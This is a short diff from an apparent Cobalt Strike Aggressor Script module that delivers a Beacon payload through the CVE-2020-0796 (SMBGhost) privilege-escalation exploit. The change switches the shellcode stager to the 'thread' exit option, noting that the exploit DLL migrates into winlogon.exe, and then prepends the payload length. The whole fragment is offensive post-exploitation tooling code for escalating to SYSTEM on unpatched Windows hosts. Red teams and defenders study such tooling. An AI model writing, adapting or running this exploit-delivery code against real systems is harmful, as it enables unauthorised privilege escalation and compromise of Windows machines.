@@ -235,8 +235,8 @@ sub cve_2020_0796_exploit {
 	# acknowledge this command
 	btask($1, "Task Beacon to run " . listener_describe($2) . " via cve-2020-0796", "T1068");
 
-	# generate our shellcode
-	$stager = payload_local($1, $2, "x64");
+	# generate our shellcode. Use 'thread' exit option as this DLL implementation migrates into winlogon.exe
+	$stager = payload_local($1, $2, "x64", "thread");
 
 	# prepend our length to the shellcode
 	$stager = pack("I-", strlen($stager)) . $stager;
